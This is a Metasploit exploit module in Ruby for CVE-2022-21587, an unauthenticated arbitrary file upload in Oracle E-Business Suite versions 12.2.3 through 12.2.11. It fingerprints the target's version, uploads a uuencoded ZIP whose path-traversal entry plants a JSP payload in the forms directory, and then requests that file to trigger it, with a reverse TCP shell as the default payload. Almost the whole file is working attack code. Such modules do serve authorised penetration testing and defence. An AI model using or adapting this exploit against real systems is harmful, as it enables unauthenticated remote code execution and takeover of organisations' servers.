##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload',
        'Description' => %q{
          This module exploits an unauthenticated arbitrary file upload vulnerability in Oracle Web Applications
          Desktop Integrator, as shipped with Oracle EBS versions 12.2.3 through to 12.2.11, in
          order to gain remote code execution as the oracle user.
        },
        'Author' => [
          'sf', # MSF Exploit & Rapid7 Analysis
          'HMs', # Python PoC
          'l1k3beef', # Original Discoverer
        ],
        'References' => [
          ['CVE', '2022-21587'],
          ['URL', 'https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis'],
          ['URL', 'https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/'],
          ['URL', 'https://github.com/hieuminhnv/CVE-2022-21587-POC']
        ],
        'DisclosureDate' => '2022-10-01',
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'Arch' => ARCH_JAVA,
        'Privileged' => false, # Code execution as user 'oracle'
        'Targets' => [
          [
            'Oracle EBS on Linux (OVA Install)',
            {
              'Platform' => 'linux',
              'EBSBasePath' => '/u01/install/APPS/fs1/',
              'EBSUploadPath' => 'EBSapps/appl/bne/12.0.0/upload/',
              'EBSFormsPath' => 'FMW_Home/Oracle_EBS-app1/applications/forms/forms/'
            }
          ]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8000)
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => '/OA_HTML/FrmReportData'
    )

    return CheckCode::Unknown('Connection failed') unless res

    return CheckCode::Unknown unless res.code == 200

    match = res.body.match(%r{jsLibs/Common(\d+_\d+_\d+)})

    if match && (match.length == 2)
      version = Rex::Version.new(match[1].gsub('_', '.'))

      if version.between?(Rex::Version.new('12.2.3'), Rex::Version.new('12.2.11'))
        return CheckCode::Appears("Oracle EBS version #{version} detected.")
      end

      return CheckCode::Safe("Oracle EBS version #{version} detected.")
    end

    CheckCode::Safe
  end

  def exploit
    endpoints = %w[BneViewerXMLService BneDownloadService BneOfflineLOVService BneUploaderService]

    target_url = "/OA_HTML/#{endpoints.sample}"

    print_status("Targeting the endpoint: #{target_url}")

    jsp_name = Rex::Text.rand_text_alpha_lower(3..8) + '.jsp'

    jsp_path = '../' * target['EBSUploadPath'].split('/').length

    jsp_path << "#{target['EBSFormsPath']}#{jsp_name}"

    jsp_absolute_path = "#{target['EBSBasePath']}#{target['EBSFormsPath']}#{jsp_name}"

    zip = Rex::Zip::Archive.new
    zip.add_file(jsp_path, payload.encoded)

    # The ZIP file is expected to be encoded with the binary to text encoding mechanism called uuencode.
    # For a detailed description refer to the Rapid7 AttackerKB analysis in the References section of this module.
    uue_data = "begin 777 #{Rex::Text.rand_text_alpha_lower(3..8)}.zip\n"
    uue_data << [zip.pack].pack('u')
    uue_data << "end\n"

    uue_name = "#{Rex::Text.rand_text_alpha_lower(3..8)}.uue"

    mime = Rex::MIME::Message.new
    mime.add_part(uue_data, 'text/plain', nil, %(form-data; name="file"; filename="#{uue_name}"))

    register_file_for_cleanup(jsp_absolute_path)

    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => target_url,
        'vars_get' => { 'bne:uueupload' => 'true' },
        'encode_params' => true,
        'ctype' => "multipart/form-data; boundary=#{mime.bound}",
        'data' => mime.to_s
      }
    )

    unless res && res.code == 200 && res.body.include?('bne:text="Cannot be logged in as GUEST."')
      fail_with(Failure::UnexpectedReply, 'Failed to upload the payload')
    end

    print_status('Triggering the payload...')

    send_request_cgi(
      'method' => 'GET',
      'uri' => "/forms/#{jsp_name}"
    )
  end

end
